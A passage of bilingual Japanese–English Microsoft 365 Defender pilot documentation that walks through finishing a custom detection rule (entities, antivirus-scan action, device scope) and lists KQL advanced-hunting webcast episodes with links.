   ![アラートの詳細を定義できる [検出ルールの作成] ページのスクリーンショット](../../media/mtp/fig23.png)

   <span data-ttu-id="de377-351">この検出ルールの警告に関する情報に基づいた決定を次のユーザーに提供するために、フィールドに明確な情報を入力してください。</span><span class="sxs-lookup"><span data-stu-id="de377-351">Ensure that you fill out the fields with clarity to help give the next user an informed decision about this detection rule alert</span></span>

3. <span data-ttu-id="de377-352">このアラートに影響を与えるエンティティを選択します。</span><span class="sxs-lookup"><span data-stu-id="de377-352">Select what entities are impacted in this alert.</span></span> <span data-ttu-id="de377-353">この場合は、[デバイス] と [ **メールボックス]** を **選択します**。</span><span class="sxs-lookup"><span data-stu-id="de377-353">In this case, select **Device** and **Mailbox**.</span></span>

   ![影響を受け取るエンティティのパラメーターを選択できる [検出ルールの作成] ページのスクリーンショット](../../media/mtp/fig24.png)

4. <span data-ttu-id="de377-355">アラートがトリガーされた場合に実行するアクションを決定します。</span><span class="sxs-lookup"><span data-stu-id="de377-355">Determine what actions should take place if the alert is triggered.</span></span> <span data-ttu-id="de377-356">この場合は、ウイルス対策スキャンを実行しますが、他の操作を実行できます。</span><span class="sxs-lookup"><span data-stu-id="de377-356">In this case, run an antivirus scan, though other actions could be taken.</span></span>

   ![脅威に対処するためにアラートがトリガーされた場合にウイルス対策スキャンを実行できる [検出ルールの作成] ページのスクリーンショット](../../media/mtp/fig25.png)

5. <span data-ttu-id="de377-358">アラート ルールのスコープを選択します。</span><span class="sxs-lookup"><span data-stu-id="de377-358">Select the scope for the alert rule.</span></span> <span data-ttu-id="de377-359">このクエリにはデバイスが含まれるので、デバイス グループは、Microsoft Defender for Endpoint コンテキストに従ったこのカスタム検出に関連しています。</span><span class="sxs-lookup"><span data-stu-id="de377-359">Since this query involve devices, the device groups are relevant in this custom detection according to Microsoft Defender for Endpoint context.</span></span> <span data-ttu-id="de377-360">影響を受け取るエンティティとしてデバイスを含めないカスタム検出を作成する場合、スコープは適用されません。</span><span class="sxs-lookup"><span data-stu-id="de377-360">When creating a custom detection that does not include devices as impacted entities, scope does not apply.</span></span>

   ![アラート ルールの範囲を設定できる [検出ルールの作成] ページのスクリーンショットは、表示される結果に対する期待を管理します。](../../media/mtp/fig26.png)

   <span data-ttu-id="de377-362">このパイロットでは、このルールを実稼働環境のテスト デバイスのサブセットに制限できます。</span><span class="sxs-lookup"><span data-stu-id="de377-362">For this pilot, you might want to limit this rule to a subset of testing devices in your production environment.</span></span>

6. <span data-ttu-id="de377-363">**[作成]** を選択します。</span><span class="sxs-lookup"><span data-stu-id="de377-363">Select **Create**.</span></span> <span data-ttu-id="de377-364">次に、 **ナビゲーション パネルから [カスタム** 検出ルール] を選択します。</span><span class="sxs-lookup"><span data-stu-id="de377-364">Then, select **Custom detection rules** from the navigation panel.</span></span>

   ![メニューの [カスタム検出ルール] オプションのスクリーンショット](../../media/mtp/fig27a.png)

   ![ルールと実行の詳細を表示する [検出ルール] ページのスクリーンショット](../../media/mtp/fig27b.png)

   <span data-ttu-id="de377-367">このページで検出ルールを選択すると、詳細ページが開きます。</span><span class="sxs-lookup"><span data-stu-id="de377-367">From this page, you can select the detection rule, which will open a details page.</span></span>

   ![ルールの実行、トリガーされたアラートとアクション、検出の編集の状態を確認できる電子メールの添付ファイル ページのスクリーンショット](../../media/mtp/fig28.png)

### <a name="additional-advanced-hunting-walk-through-exercises"></a><span data-ttu-id="de377-369">その他の高度なハンティング のウォークスルー演習</span><span class="sxs-lookup"><span data-stu-id="de377-369">Additional advanced hunting walk-through exercises</span></span>

<span data-ttu-id="de377-370">高度な検索の詳細については、次の Web キャストを使用して、Microsoft 365 Defender 内の高度な検索機能について説明し、クロスピラー クエリの作成、エンティティへのピボット、カスタム検出と修復アクションの作成を行います。</span><span class="sxs-lookup"><span data-stu-id="de377-370">To learn more about advanced hunting, the following webcasts will walk you through the capabilities of advanced hunting within Microsoft 365 Defender to create cross-pillar queries, pivot to entities and create custom detections and remediation actions.</span></span>

> [!NOTE]
> <span data-ttu-id="de377-371">パイロット テスト ラボ環境で検索クエリを実行するために、独自の GitHub アカウントを準備します。</span><span class="sxs-lookup"><span data-stu-id="de377-371">Be prepared with your own GitHub account to run the hunting queries in your pilot test lab environment.</span></span>

|<span data-ttu-id="de377-372">タイトル</span><span class="sxs-lookup"><span data-stu-id="de377-372">Title</span></span>|<span data-ttu-id="de377-373">説明</span><span class="sxs-lookup"><span data-stu-id="de377-373">Description</span></span>|<span data-ttu-id="de377-374">MP4 のダウンロード</span><span class="sxs-lookup"><span data-stu-id="de377-374">Download MP4</span></span>|<span data-ttu-id="de377-375">YouTube で視聴する</span><span class="sxs-lookup"><span data-stu-id="de377-375">Watch on YouTube</span></span>|<span data-ttu-id="de377-376">使用する CSL ファイル</span><span class="sxs-lookup"><span data-stu-id="de377-376">CSL file to use</span></span>|
|---|---|---|---|---|
|<span data-ttu-id="de377-377">エピソード 1: KQL の基本</span><span class="sxs-lookup"><span data-stu-id="de377-377">Episode 1: KQL fundamentals</span></span>|<span data-ttu-id="de377-378">Microsoft 365 Defender の高度な検索機能の基本について説明します。</span><span class="sxs-lookup"><span data-stu-id="de377-378">We'll cover the basics of advanced hunting capabilities in Microsoft 365 Defender.</span></span> <span data-ttu-id="de377-379">利用可能な高度なハンティング データと基本的な KQL 構文と演算子について説明します。</span><span class="sxs-lookup"><span data-stu-id="de377-379">Learn about available advanced hunting data and basic KQL syntax and operators.</span></span>|[<span data-ttu-id="de377-380">MP4</span><span class="sxs-lookup"><span data-stu-id="de377-380">MP4</span></span>](https://aka.ms/MTP15JUL20_MP4)|[<span data-ttu-id="de377-381">YouTube</span><span class="sxs-lookup"><span data-stu-id="de377-381">YouTube</span></span>](https://youtu.be/0D9TkGjeJwM)|[<span data-ttu-id="de377-382">エピソード 1: Git の CSL ファイル</span><span class="sxs-lookup"><span data-stu-id="de377-382">Episode 1: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%201%20-%20KQL%20Fundamentals.csl)|
|<span data-ttu-id="de377-383">エピソード 2: 参加</span><span class="sxs-lookup"><span data-stu-id="de377-383">Episode 2: Joins</span></span>|<span data-ttu-id="de377-384">高度な検索のデータと、テーブルを結合する方法について、今後も学習します。</span><span class="sxs-lookup"><span data-stu-id="de377-384">We'll continue learning about data in advanced hunting and how to join tables together.</span></span> <span data-ttu-id="de377-385">内部結合、外部結合、一意結合、および半結合、および既定の Kusto 内部一意結合のニュアンスについて説明します。</span><span class="sxs-lookup"><span data-stu-id="de377-385">Learn about inner, outer, unique, and semi joins, and the nuances of the default Kusto innerunique join.</span></span>|[<span data-ttu-id="de377-386">MP4</span><span class="sxs-lookup"><span data-stu-id="de377-386">MP4</span></span>](https://aka.ms/MTP22JUL20_MP4)|[<span data-ttu-id="de377-387">YouTube</span><span class="sxs-lookup"><span data-stu-id="de377-387">YouTube</span></span>](https://youtu.be/LMrO6K5TWOU)|[<span data-ttu-id="de377-388">エピソード 2: Git の CSL ファイル</span><span class="sxs-lookup"><span data-stu-id="de377-388">Episode 2: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%202%20-%20Joins.csl)|
|<span data-ttu-id="de377-389">エピソード 3: データの要約、ピボット、および視覚化</span><span class="sxs-lookup"><span data-stu-id="de377-389">Episode 3: Summarizing, pivoting, and visualizing data</span></span>|<span data-ttu-id="de377-390">データのフィルター処理、操作、結合ができたので、次は、データの要約、定量化、ピボット、および視覚化を開始します。</span><span class="sxs-lookup"><span data-stu-id="de377-390">Now that we're able to filter, manipulate, and join data, it's time to start summarizing, quantifying, pivoting, and visualizing.</span></span> <span data-ttu-id="de377-391">このエピソードでは、高度な検索スキーマの追加のテーブルに入る間に実行できる集計演算子と、実行できる計算の一部について説明します。</span><span class="sxs-lookup"><span data-stu-id="de377-391">In this episode, we'll cover the summarize operator and some of the calculations you can perform while diving into additional tables in the advanced hunting schema.</span></span> <span data-ttu-id="de377-392">データセットを分析の改善に役立つグラフに変換します。</span><span class="sxs-lookup"><span data-stu-id="de377-392">We turn our datasets into charts that can help improve analysis.</span></span>|[<span data-ttu-id="de377-393">MP4</span><span class="sxs-lookup"><span data-stu-id="de377-393">MP4</span></span>](https://aka.ms/MTP29JUL20_MP4)|[<span data-ttu-id="de377-394">YouTube</span><span class="sxs-lookup"><span data-stu-id="de377-394">YouTube</span></span>](https://youtu.be/UKnk9U1NH6Y)|[<span data-ttu-id="de377-395">エピソード 3: Git の CSL ファイル</span><span class="sxs-lookup"><span data-stu-id="de377-395">Episode 3: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%203%20-%20Summarizing%2C%20Pivoting%2C%20and%20Joining.csl)|
|<span data-ttu-id="de377-396">エピソード 4: ハントしましょう。</span><span class="sxs-lookup"><span data-stu-id="de377-396">Episode 4: Let's hunt!</span></span> <span data-ttu-id="de377-397">KQL をインシデント追跡に適用する</span><span class="sxs-lookup"><span data-stu-id="de377-397">Applying KQL to incident tracking</span></span>|<span data-ttu-id="de377-398">攻撃者のアクティビティを追跡する時間です。</span><span class="sxs-lookup"><span data-stu-id="de377-398">Time to track some attacker activity!</span></span> <span data-ttu-id="de377-399">このエピソードでは、KQL と Microsoft 365 Defender の高度な検索に関する改善された理解を使用して、攻撃を追跡します。</span><span class="sxs-lookup"><span data-stu-id="de377-399">In this episode, we'll use our improved understanding of KQL and advanced hunting in Microsoft 365 Defender to track an attack.</span></span> <span data-ttu-id="de377-400">攻撃者のアクティビティを追跡するためにこのフィールドで使用されるヒントとコツについて説明します。サイバー セキュリティの ABC や、それらをインシデント対応に適用する方法などです。</span><span class="sxs-lookup"><span data-stu-id="de377-400">Learn some of the tips and tricks used in the field to track attacker activity, including the ABCs of cybersecurity and how to apply them to incident response.</span></span>|[<span data-ttu-id="de377-401">MP4</span><span class="sxs-lookup"><span data-stu-id="de377-401">MP4</span></span>](https://aka.ms/MTP5AUG20_MP4)|[<span data-ttu-id="de377-402">YouTube</span><span class="sxs-lookup"><span data-stu-id="de377-402">YouTube</span></span>](https://youtu.be/2EUxOc_LNd8)|[<span data-ttu-id="de377-403">エピソード 4: Git の CSL ファイル</span><span class="sxs-lookup"><span data-stu-id="de377-403">Episode 4: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%204%20-%20Lets%20Hunt.csl)|
|

## <a name="next-step"></a><span data-ttu-id="de377-404">次の手順</span><span class="sxs-lookup"><span data-stu-id="de377-404">Next step</span></span>

|<span data-ttu-id="de377-405">![終了フェーズと要約フェーズ](../../media/mtp/close.png)</span><span class="sxs-lookup"><span data-stu-id="de377-405">![Closing and summary phase](../../media/mtp/close.png)</span></span> <br>[<span data-ttu-id="de377-406">終了フェーズと要約フェーズ</span><span class="sxs-lookup"><span data-stu-id="de377-406">Closing and summary phase</span></span>](mtp-pilot-close.md)|<span data-ttu-id="de377-407">Microsoft 365 Defender パイロットの結果を分析し、関係者に提示して、次の手順を実行します。</span><span class="sxs-lookup"><span data-stu-id="de377-407">Analyze your Microsoft 365 Defender pilot outcome, present them to your stakeholders, and take the next step.</span></span>
|:-----|:-----|
